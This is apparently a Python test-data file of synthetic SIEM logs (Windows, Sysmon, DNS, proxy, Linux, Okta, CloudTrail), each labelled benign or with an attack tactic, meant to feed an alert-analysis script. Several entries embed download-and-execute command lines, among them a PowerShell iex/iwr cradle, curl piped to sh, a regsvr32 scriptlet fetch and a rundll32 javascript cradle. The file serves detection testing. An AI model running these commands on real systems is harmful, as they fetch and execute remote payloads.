# Auto-generated synthetic logs dataset (2025-11-10)
# Drop-in replacement for synthetic_logs.py

SYNTHETIC_LOGS = [
  {
    "case_name": "WinSec_4625_password_spray_1",
    "source_product": "WINEVENT",
    "threat_category": [
      "Credential Access"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:00:00Z",
      "event_id": 4625,
      "source": "Microsoft-Windows-Security-Auditing",
      "FailureReason": "Unknown user name or bad password.",
      "LogonType": 3,
      "TargetUserName": "admin",
      "TargetDomainName": "DOMAIN",
      "WorkstationName": "WORKSTATION-01",
      "IpAddress": "198.51.100.54",
      "computer": "WORKSTATION-01",
      "message": "An account failed to log on."
    }
  },
  {
    "case_name": "WinSec_4625_password_spray_2",
    "source_product": "WINEVENT",
    "threat_category": [
      "Credential Access"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:01:00Z",
      "event_id": 4625,
      "source": "Microsoft-Windows-Security-Auditing",
      "FailureReason": "Unknown user name or bad password.",
      "LogonType": 3,
      "TargetUserName": "admin",
      "TargetDomainName": "DOMAIN",
      "WorkstationName": "WORKSTATION-01",
      "IpAddress": "198.51.100.54",
      "computer": "WORKSTATION-01",
      "message": "An account failed to log on."
    }
  },
  {
    "case_name": "WinSec_4624_success_from_ext",
    "source_product": "WINEVENT",
    "threat_category": [
      "Initial Access"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:02:00Z",
      "event_id": 4624,
      "source": "Microsoft-Windows-Security-Auditing",
      "level": "Information",
      "LogonType": 3,
      "TargetUserName": "admin",
      "TargetDomainName": "DOMAIN",
      "WorkstationName": "WORKSTATION-01",
      "IpAddress": "203.0.113.45",
      "LogonProcessName": "NtLmSsp",
      "AuthenticationPackageName": "Negotiate",
      "TargetLogonId": "0x123456",
      "computer": "DC-01",
      "message": "An account was successfully logged on."
    }
  },
  {
    "case_name": "WinSec_4648_logon_explicit_creds",
    "source_product": "WINEVENT",
    "threat_category": [
      "Lateral Movement"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:05:00Z",
      "event_id": 4648,
      "source": "Microsoft-Windows-Security-Auditing",
      "SubjectUserName": "admin",
      "SubjectDomainName": "DOMAIN",
      "TargetServerName": "DC-01",
      "IpAddress": "192.168.1.100",
      "computer": "WORKSTATION-01",
      "message": "A logon was attempted using explicit credentials."
    }
  },
  {
    "case_name": "WinSec_4672_admin_privs",
    "source_product": "WINEVENT",
    "threat_category": [
      "Privilege Escalation"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:06:00Z",
      "event_id": 4672,
      "source": "Microsoft-Windows-Security-Auditing",
      "SubjectUserName": "admin",
      "SubjectDomainName": "DOMAIN",
      "computer": "DC-01",
      "message": "Special privileges assigned to new logon."
    }
  },
  {
    "case_name": "WinSec_7045_service_install",
    "source_product": "WINEVENT",
    "threat_category": [
      "Persistence",
      "Execution"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:12:00Z",
      "event_id": 7045,
      "source": "Service Control Manager",
      "ServiceName": "WinUpdateHelper",
      "ServiceFileName": "C:\\Windows\\Temp\\wuhelper.exe",
      "ServiceType": "user mode service",
      "StartType": "auto start",
      "AccountName": "LocalSystem",
      "computer": "WORKSTATION-01",
      "message": "A service was installed in the system."
    }
  },
  {
    "case_name": "WinSec_1102_cleared_logs",
    "source_product": "WINEVENT",
    "threat_category": [
      "Defense Evasion"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:14:00Z",
      "event_id": 1102,
      "source": "Microsoft-Windows-Eventlog",
      "SubjectUserName": "admin",
      "SubjectDomainName": "DOMAIN",
      "computer": "WORKSTATION-01",
      "message": "The audit log was cleared."
    }
  },
  {
    "case_name": "PS_4104_malicious_download",
    "source_product": "WINEVENT",
    "threat_category": [
      "Execution"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:10:00Z",
      "event_id": 4104,
      "source": "Microsoft-Windows-PowerShell",
      "ScriptBlockText": "iex (iwr -UseBasicParsing http://203.0.113.200/p.sh)",
      "User": "DOMAIN\\user1",
      "computer": "WORKSTATION-01"
    }
  },
  {
    "case_name": "PS_4104_benign_admin",
    "source_product": "WINEVENT",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:09:00Z",
      "event_id": 4104,
      "source": "Microsoft-Windows-PowerShell",
      "ScriptBlockText": "Import-Module ActiveDirectory; Get-ADUser -Filter * -ResultSetSize 5",
      "User": "DOMAIN\\itadmin",
      "computer": "WORKSTATION-01"
    }
  },
  {
    "case_name": "WinSec_4688_whoami_priv",
    "source_product": "WINEVENT",
    "threat_category": [
      "Discovery"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:07:00Z",
      "event_id": 4688,
      "source": "Microsoft-Windows-Security-Auditing",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "cmd.exe /c whoami /priv",
      "SubjectUserName": "admin",
      "SubjectDomainName": "DOMAIN",
      "NewProcessId": "0x4D2",
      "ParentProcessId": "0x237",
      "computer": "WORKSTATION-01"
    }
  },
  {
    "case_name": "WinSec_4688_benign_msedge",
    "source_product": "WINEVENT",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:04:00Z",
      "event_id": 4688,
      "source": "Microsoft-Windows-Security-Auditing",
      "NewProcessName": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" https://intranet.company.com",
      "SubjectUserName": "DOMAIN\\employee",
      "SubjectDomainName": "DOMAIN",
      "NewProcessId": "0x4E0",
      "ParentProcessId": "0x300",
      "computer": "WORKSTATION-01"
    }
  },
  {
    "case_name": "AD_4662_DCSync_like",
    "source_product": "AD",
    "threat_category": [
      "Credential Access",
      "Discovery"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:08:00Z",
      "event_id": 4662,
      "source": "Microsoft-Windows-Security-Auditing",
      "ObjectDN": "CN=Users,DC=company,DC=com",
      "ObjectClass": "domainDNS",
      "Properties": [
        "DS-Replication-Get-Changes",
        "DS-Replication-Get-Changes-All"
      ],
      "AccessMask": "0x100",
      "SubjectUserName": "user1",
      "SubjectDomainName": "DOMAIN",
      "IpAddress": "192.168.1.100",
      "computer": "DC-01",
      "message": "An operation was performed on an object."
    }
  },
  {
    "case_name": "DNS_suspicious_long_query_TXT",
    "source_product": "DNS",
    "threat_category": [
      "Command and Control"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:11:00Z",
      "query": "x1a2b3c4d5e6f7g8h9i0.data.cdn-update-check[.]com",
      "qtype": "TXT",
      "rcode": "NOERROR",
      "client_ip": "192.168.1.100",
      "resolver": "dns01.company.com"
    }
  },
  {
    "case_name": "DNS_benign_os_update",
    "source_product": "DNS",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:03:00Z",
      "query": "update.microsoft.com",
      "qtype": "A",
      "rcode": "NOERROR",
      "client_ip": "192.168.1.100",
      "resolver": "dns01.company.com"
    }
  },
  {
    "case_name": "Proxy_suspicious_large_post",
    "source_product": "PROXY",
    "threat_category": [
      "Exfiltration"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:16:00Z",
      "user": "DOMAIN\\user1",
      "src_ip": "192.168.1.100",
      "dest_host": "cdn-update-check.example",
      "dest_ip": "203.0.113.200",
      "url": "https://cdn-update-check.example/upload",
      "http_method": "POST",
      "bytes_out": 5242880,
      "status": 200
    }
  },
  {
    "case_name": "Proxy_benign_updates",
    "source_product": "PROXY",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:02:00Z",
      "user": "DOMAIN\\employee",
      "src_ip": "192.168.1.100",
      "dest_host": "updates.microsoft.com",
      "dest_ip": "13.107.246.45",
      "url": "https://updates.microsoft.com/defender/signatures",
      "http_method": "GET",
      "bytes_out": 10240,
      "status": 200
    }
  },
  {
    "case_name": "FW_allow_egress_to_c2",
    "source_product": "FIREWALL",
    "threat_category": [
      "Command and Control"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:15:00Z",
      "src_ip": "192.168.1.100",
      "src_port": 50544,
      "dest_ip": "203.0.113.200",
      "dest_port": 443,
      "action": "ALLOW",
      "proto": "TCP"
    }
  },
  {
    "case_name": "FW_allow_benign_443",
    "source_product": "FIREWALL",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:05:00Z",
      "src_ip": "192.168.1.100",
      "src_port": 50123,
      "dest_ip": "13.107.246.45",
      "dest_port": 443,
      "action": "ALLOW",
      "proto": "TCP"
    }
  },
  {
    "case_name": "Sysmon_EID1_LOLBIN_regsvr32",
    "source_product": "SYSMON",
    "threat_category": [
      "Execution",
      "Defense Evasion"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:13:00Z",
      "event_id": 1,
      "source": "Microsoft-Windows-Sysmon",
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "CommandLine": "regsvr32 /s /n /u /i:http://example-cdn[.]com/file.sct scrobj.dll",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "User": "DOMAIN\\user1",
      "Computer": "WORKSTATION-01",
      "Hashes": "SHA256=ecf3a2..."
    }
  },
  {
    "case_name": "Sysmon_EID3_C2_connect",
    "source_product": "SYSMON",
    "threat_category": [
      "Command and Control"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:15:00Z",
      "event_id": 3,
      "source": "Microsoft-Windows-Sysmon",
      "Image": "C:\\Windows\\System32\\rundll32.exe",
      "User": "DOMAIN\\user1",
      "DestinationIp": "203.0.113.200",
      "DestinationPort": 443,
      "DestinationHostname": "cdn-update-check[.]com",
      "Protocol": "tcp",
      "Computer": "WORKSTATION-01"
    }
  },
  {
    "case_name": "Linux_auth_failed",
    "source_product": "LINUX",
    "threat_category": [
      "Credential Access"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:20:00Z",
      "host": "web-01",
      "facility": "authpriv",
      "program": "sshd",
      "message": "Failed password for invalid user admin from 198.51.100.54 port 52344 ssh2"
    }
  },
  {
    "case_name": "Linux_auth_success",
    "source_product": "LINUX",
    "threat_category": [
      "Initial Access"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:22:00Z",
      "host": "web-01",
      "facility": "authpriv",
      "program": "sshd",
      "message": "Accepted password for svc-web from 198.51.100.54 port 52390 ssh2"
    }
  },
  {
    "case_name": "Linux_sudo_privileged_cmd",
    "source_product": "LINUX",
    "threat_category": [
      "Privilege Escalation"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:23:00Z",
      "host": "web-01",
      "facility": "authpriv",
      "program": "sudo",
      "message": "svc-web : TTY=pts/0 ; PWD=/home/svc-web ; USER=root ; COMMAND=/bin/bash -lc 'curl -fsSL http://203.0.113.200/p.sh | sh'"
    }
  },
  {
    "case_name": "Okta_login_NY",
    "source_product": "Okta",
    "threat_category": [
      "Initial Access"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:25:00Z",
      "event_type": "user.authentication.sso",
      "outcome": "SUCCESS",
      "actor": {
        "id": "00u123",
        "alternateId": "user1@company.com"
      },
      "client": {
        "ipAddress": "198.51.100.10",
        "userAgent": "Chrome"
      },
      "geolocation": {
        "city": "New York",
        "country": "US"
      },
      "displayMessage": "User single sign on to app"
    }
  },
  {
    "case_name": "Okta_login_SG",
    "source_product": "Okta",
    "threat_category": [
      "Initial Access"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:37:00Z",
      "event_type": "user.authentication.sso",
      "outcome": "SUCCESS",
      "actor": {
        "id": "00u123",
        "alternateId": "user1@company.com"
      },
      "client": {
        "ipAddress": "203.0.113.88",
        "userAgent": "Chrome"
      },
      "geolocation": {
        "city": "Singapore",
        "country": "SG"
      },
      "displayMessage": "User single sign on to app"
    }
  },
  {
    "case_name": "CloudTrail_AssumeRole",
    "source_product": "AWS CloudTrail",
    "threat_category": [
      "Privilege Escalation"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:40:00Z",
      "eventName": "AssumeRole",
      "userIdentity": {
        "type": "IAMUser",
        "userName": "appsvc"
      },
      "requestParameters": {
        "roleArn": "arn:aws:iam::111122223333:role/AdminRole"
      },
      "sourceIPAddress": "203.0.113.88",
      "awsRegion": "us-east-1"
    }
  },
  {
    "case_name": "CloudTrail_ListSecrets",
    "source_product": "AWS CloudTrail",
    "threat_category": [
      "Discovery"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:42:00Z",
      "eventName": "ListSecrets",
      "userIdentity": {
        "type": "AssumedRole",
        "arn": "arn:aws:sts::111122223333:assumed-role/AdminRole/appsvc"
      },
      "sourceIPAddress": "203.0.113.88",
      "awsRegion": "us-east-1"
    }
  },
  {
    "case_name": "CloudTrail_GetObject_sensitive",
    "source_product": "AWS CloudTrail",
    "threat_category": [
      "Exfiltration"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:45:00Z",
      "eventName": "GetObject",
      "requestParameters": {
        "bucketName": "prod-secrets",
        "key": "db/passwords.enc"
      },
      "userIdentity": {
        "type": "AssumedRole",
        "arn": "arn:aws:sts::111122223333:assumed-role/AdminRole/appsvc"
      },
      "sourceIPAddress": "203.0.113.88",
      "awsRegion": "us-east-1"
    }
  },
  {
    "case_name": "VPN_assign_ip_user1",
    "source_product": "VPN",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:01:00Z",
      "username": "user1@company.com",
      "public_ip": "203.0.113.45",
      "assigned_internal_ip": "192.168.1.100",
      "vpn_gateway": "vpn01.company.com"
    }
  },
  {
    "case_name": "DHCP_lease_WS",
    "source_product": "DHCP",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:01:00Z",
      "mac": "00-16-3E-2A-6C-4B",
      "ip": "192.168.1.100",
      "hostname": "WORKSTATION-01",
      "dhcp_server": "dhcp01.company.com"
    }
  },
  {
    "case_name": "WinSec_4768_TGT",
    "source_product": "WINEVENT",
    "threat_category": [
      "Discovery"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:06:00Z",
      "event_id": 4768,
      "source": "Microsoft-Windows-Security-Auditing",
      "TargetUserName": "admin",
      "IpAddress": "192.168.1.100",
      "TicketOptions": "0x40810010",
      "TicketEncryptionType": "0x12",
      "computer": "DC-01"
    }
  },
  {
    "case_name": "WinSec_4769_TGS",
    "source_product": "WINEVENT",
    "threat_category": [
      "Lateral Movement"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:07:00Z",
      "event_id": 4769,
      "source": "Microsoft-Windows-Security-Auditing",
      "ServiceName": "cifs/WS-01",
      "IpAddress": "192.168.1.100",
      "TicketOptions": "0x40810010",
      "TicketEncryptionType": "0x12",
      "computer": "DC-01"
    }
  },
  {
    "case_name": "WinSec_4657_registry_runkey",
    "source_product": "WINEVENT",
    "threat_category": [
      "Persistence"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:12:00Z",
      "event_id": 4657,
      "source": "Microsoft-Windows-Security-Auditing",
      "ObjectName": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
      "OperationType": "New value created",
      "ProcessName": "C:\\Windows\\System32\\reg.exe",
      "SubjectUserName": "admin",
      "SubjectDomainName": "DOMAIN",
      "computer": "WORKSTATION-01"
    }
  },
  {
    "case_name": "DNS_benign_crl",
    "source_product": "DNS",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:06:00Z",
      "query": "crl.microsoft.com",
      "qtype": "A",
      "rcode": "NOERROR",
      "client_ip": "192.168.1.100",
      "resolver": "dns01.company.com"
    }
  },
  {
    "case_name": "Proxy_benign_cdn",
    "source_product": "PROXY",
    "threat_category": [
      "Benign"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:06:00Z",
      "user": "DOMAIN\\employee",
      "src_ip": "192.168.1.100",
      "dest_host": "ajax.googleapis.com",
      "dest_ip": "142.250.72.234",
      "url": "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js",
      "http_method": "GET",
      "bytes_out": 20480,
      "status": 200
    }
  },
  {
    "case_name": "WinSec_4688_rundll32_download_cradle",
    "source_product": "WINEVENT",
    "threat_category": [
      "Execution"
    ],
    "raw_log": {
      "timestamp": "2024-03-20T10:13:00Z",
      "event_id": 4688,
      "source": "Microsoft-Windows-Security-Auditing",
      "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
      "SubjectUserName": "admin",
      "SubjectDomainName": "DOMAIN",
      "NewProcessId": "0x4F1",
      "ParentProcessId": "0x237",
      "computer": "WORKSTATION-01"
    }
  }
]


def get_test_cases():
    """Return test cases in the structure expected by notable_analysis.py.

    notable_analysis.py expects:
      [{"name": str, "alert": {"summary": str, "risk_index": dict, "raw_log": dict}}, ...]
    """
    cases = []
    for item in SYNTHETIC_LOGS:
        case_name = item.get("case_name", "UnnamedCase")
        source_product = item.get("source_product", "unknown")
        threat_category = item.get("threat_category", [])
        if isinstance(threat_category, list):
            threat_category_str = ", ".join(str(x) for x in threat_category)
        else:
            threat_category_str = str(threat_category)

        raw_log = item.get("raw_log", {})
        if not isinstance(raw_log, dict):
            raw_log = {"raw_event": raw_log}

        alert = {
            "summary": f"Synthetic notable: {case_name}",
            "risk_index": {
                "risk_score": "N/A",
                "source_product": source_product,
                "threat_category": threat_category_str or "N/A",
            },
            "raw_log": raw_log,
        }
        cases.append({"name": case_name, "alert": alert})
    return cases
